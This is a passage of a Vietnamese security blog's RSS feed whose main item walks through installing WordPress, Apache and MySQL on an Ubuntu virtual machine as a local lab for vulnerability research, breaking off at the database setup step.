noreferrer&#34;&gt;SQL Injection Cheat Sheet ‚Äì PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-1-1-5-6-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin &amp;lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Local and Debugging</title>
      <link>http://localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/</link>
      <pubDate>Thu, 21 Aug 2025 09:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/</guid>
      <category domain="http://localhost:1313/vi/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-08-21-wordpress-local-and-debugging/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;WordPress&lt;/strong&gt; l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ra ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶&lt;/li&gt;&#xA;&lt;li&gt;Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;C√≥ 2 phi√™n b·∫£n WordPress:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;WordPress.com&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;D·ªãch v·ª• hosting do Automattic cung c·∫•p&lt;/li&gt;&#xA;&lt;li&gt;B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t&lt;/li&gt;&#xA;&lt;li&gt;H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;WordPress.org&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng&lt;/li&gt;&#xA;&lt;li&gt;T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ecosystem&#34;&gt;&lt;span&gt;Ecosystem&lt;/span&gt;&#xA;  &lt;a href=&#34;#ecosystem&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Core: CMS ch√≠nh&lt;/li&gt;&#xA;&lt;li&gt;Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi&lt;/li&gt;&#xA;&lt;li&gt;Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-wordpress-hacking&#34;&gt;&lt;span&gt;Why WordPress Hacking?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-wordpress-hacking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;State of WordPress Security in 2024&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;most-popular&#34;&gt;&lt;span&gt;Most Popular&lt;/span&gt;&#xA;  &lt;a href=&#34;#most-popular&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress&lt;/li&gt;&#xA;&lt;li&gt;Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =&amp;gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c&lt;/li&gt;&#xA;&lt;li&gt;Gi·ªëng nh∆∞ &lt;code&gt;‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;plugin-and-theme&#34;&gt;&lt;span&gt;Plugin and Theme&lt;/span&gt;&#xA;  &lt;a href=&#34;#plugin-and-theme&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n &lt;strong&gt;developers&lt;/strong&gt; v√† &lt;strong&gt;researchers&lt;/strong&gt;. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng&lt;/li&gt;&#xA;&lt;li&gt;Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup-wordpress-for-hacking&#34;&gt;&lt;span&gt;Setup WordPress for Hacking&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-wordpress-for-hacking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng &lt;strong&gt;Google&lt;/strong&gt; c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o &lt;strong&gt;Ubuntu (22.04)&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t&lt;/li&gt;&#xA;&lt;li&gt;WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;install-and-configure-wordpress&#34;&gt;&lt;span&gt;Install and configure WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-and-configure-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-dependencies&#34;&gt;&lt;span&gt;Install Dependencies&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-dependencies&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install apache2 \&#xA;                 ghostscript \&#xA;                 libapache2-mod-php \&#xA;                 mysql-server \&#xA;                 php \&#xA;                 php-bcmath \&#xA;                 php-curl \&#xA;                 php-imagick \&#xA;                 php-intl \&#xA;                 php-json \&#xA;                 php-mbstring \&#xA;                 php-mysql \&#xA;                 php-xml \&#xA;                 php-zip&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-wordpress&#34;&gt;&lt;span&gt;Install WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website&#xA;sudo mkdir -p /srv/www&#xA;&#xA;# ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server&#xA;# Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data.&#xA;sudo chown www-data: /srv/www&#xA;&#xA;# T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c&#xA;# Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n&#xA;curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;C√†i t·ª´ &lt;code&gt;wordpress.org&lt;/code&gt; l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ubuntu c√≥ s·∫µn package &lt;strong&gt;wordpress&lt;/strong&gt; trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n &lt;code&gt;wordpress.org&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ &lt;code&gt;wordpress.org&lt;/code&gt;, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c.&#xA;{: .prompt-info }&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-apache-for-wordpress&#34;&gt;&lt;span&gt;Configure Apache for WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-apache-for-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o file &lt;code&gt;/etc/apache2/sites-available/wordpress.conf&lt;/code&gt; c·∫•u h√¨nh Apache cho WordPress:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP).&#xA;&amp;lt;VirtualHost *:80&amp;gt;  &#xA;&#xA;    # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress).&#xA;    DocumentRoot /srv/www/wordpress &#xA;    &amp;lt;Directory /srv/www/wordpress&amp;gt;&#xA;        Options FollowSymLinks&#xA;&#xA;        # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting.&#xA;        AllowOverride Limit Options FileInfo &#xA;&#xA;        # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã.&#xA;        DirectoryIndex index.php &#xA;&#xA;        # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public).&#xA;        Require all granted &#xA;    &amp;lt;/Directory&amp;gt;&#xA;&#xA;    # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p.&#xA;    &amp;lt;Directory /srv/www/wordpress/wp-content&amp;gt; &#xA;        Options FollowSymLinks&#xA;        Require all granted&#xA;    &amp;lt;/Directory&amp;gt;&#xA;&amp;lt;/VirtualHost&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;K√≠ch ho·∫°t site WordPress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2ensite wordpress&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;a2ensite&lt;/strong&gt; = &lt;code&gt;enable site config&lt;/code&gt; (t·∫°o symlink t·ª´ &lt;code&gt;/etc/apache2/sites-available/wordpress.conf&lt;/code&gt; sang &lt;code&gt;/etc/apache2/sites-enabled/&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;K√≠ch ho·∫°t module rewrite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2enmod rewrite&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ &lt;strong&gt;Pretty Permalinks&lt;/strong&gt; (v√≠ d·ª• &lt;code&gt;/blog/hello-world/&lt;/code&gt; thay v√¨ &lt;code&gt;?p=123&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option)&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2dissite 000-default&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Apache m·∫∑c ƒë·ªãnh c√≥ site &lt;code&gt;000-default.conf&lt;/code&gt; (ch·ªâ hi·ªÉn th·ªã &amp;ldquo;It works!&amp;rdquo;)&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port &lt;code&gt;80&lt;/code&gt; tr∆∞·ªõc WordPress&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;VirtualHost *:80&amp;gt;&#xA;    ServerName mywordpress.local&#xA;    DocumentRoot /srv/www/wordpress&#xA;    ...&#xA;&amp;lt;/VirtualHost&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Linux/Mac: &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Windows: &lt;code&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Reload Apache&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo service apache2 reload&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-database&#34;&gt;&lt;span&gt;Configure database&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 